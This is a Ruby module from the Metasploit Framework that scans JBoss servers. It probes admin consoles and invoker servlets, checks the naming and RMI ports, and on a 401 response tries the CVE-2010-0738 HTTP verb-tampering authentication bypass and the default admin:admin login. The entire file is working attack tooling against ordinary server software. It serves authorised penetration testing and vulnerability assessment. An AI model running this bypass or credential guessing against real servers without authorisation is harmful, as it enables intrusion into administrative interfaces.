##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::Report

	def initialize(info = {})
		super(update_info(info,
			'Name'                  => 'JBoss Vulnerability Scanner',
			'Description'   => %q{
				This module scans a JBoss instance for a few vulnerablities.
			},
			'Author'                => [ 'Tyler Krpata' ],
			'References'            =>
				[
					[ 'CVE', '2010-0738' ] # VERB auth bypass
				],
			'License'               => BSD_LICENSE
			))

		register_options(
			[
				OptString.new('VERB',  [ true,  "Verb for auth bypass testing", "HEAD"]),
			], self.class)
	end


	def run_host(ip)

		res = send_request_cgi(
			{
				'uri'       => "/"+Rex::Text.rand_text_alpha(12),
				'method'    => 'GET',
				'ctype'     => 'text/plain',

			}, 20)

		if res

			info = http_fingerprint({ :response => res })
			print_status(info)

			if(res.body and />(JBoss[^<]+)/.match(res.body) )
				print_error("#{rhost}:#{rport} JBoss error message: #{$1}")
			end

			apps = [ '/jmx-console/HtmlAdaptor',
				'/status',
				'/web-console/ServerInfo.jsp',
				# apps added per Patrick Hof
				'/web-console/Invoker',
				'/invoker/JMXInvokerServlet'
			]

			print_status("#{rhost}:#{rport} Checking http...")
			apps.each do |app|
				check_app(app)
			end

			ports = {
				# 1098i, 1099, and 4444 needed to use twiddle
				1098 => 'Naming Service',
				1099 => 'Naming Service',
				4444 => 'RMI invoker'
			}
			print_status("#{rhost}:#{rport} Checking services...")
			ports.each do |port,service|
				status = test_connection(ip,port) == :up ? "open" : "closed";
				print_status("#{rhost}:#{rport} #{service} tcp/#{port}: #{status}")
			end
		end
	end

	def check_app(app)

		res = send_request_cgi({
			'uri'       => app,
			'method'    => 'GET',
			'ctype'     => 'text/plain',
		}, 20)

		if (res)
			case
			when res.code == 200
				print_good("#{rhost}:#{rport} #{app} does not require authentication (200)")
			when res.code == 403
				print_status("#{rhost}:#{rport} #{app} restricted (403)")
			when res.code == 401
				print_status("#{rhost}:#{rport} #{app} requires authentication (401): #{res.headers['WWW-Authenticate']}")
				bypass_auth(app)
			when res.code == 404
				print_status("#{rhost}:#{rport} #{app} not found (404)")
			when res.code == 301, res.code == 302
				print_status("#{rhost}:#{rport} #{app} is redirected (#{res.code}) to #{res.headers['Location']} (not following)")
			else
				print_status("#{rhost}:#{rport} Don't know how to handle response code #{res.code}")
			end
		else
			print_status("#{rhost}:#{rport} #{app} not found")
		end
	end

	def bypass_auth(app)

		print_status("#{rhost}:#{rport} Check for verb tampering (HEAD)")

		res = send_request_raw({
			'uri'       => app,
			'method'    => datastore['VERB'],
			'version'   => '1.0' # 1.1 makes the head request wait on timeout for some reason
		}, 20)
		if (res and res.code == 200)
			print_good("#{rhost}:#{rport} Got authentication bypass via HTTP verb tampering")
		else
			print_status("#{rhost}:#{rport} Could not get authentication bypass via HTTP verb tampering")
		end

		res = send_request_cgi({
			'uri'       => app,
			'method'    => 'GET',
			'ctype'     => 'text/plain',
			'authorization' => basic_auth('admin','admin')
		}, 20)
		if (res and res.code == 200)
			print_good("#{rhost}:#{rport} Authenticated using admin:admin")
		else
			print_status("#{rhost}:#{rport} Could not guess admin credentials")
		end

	end

	# function stole'd from mssql_ping
	def test_connection(ip,port)
		begin
			sock = Rex::Socket::Tcp.create(
				'PeerHost' => ip,
				'PeerPort' => port,
				'Timeout' => 20
				)
		rescue Rex::ConnectionError
			return :down
		end
		sock.close
		return :up
	end

end
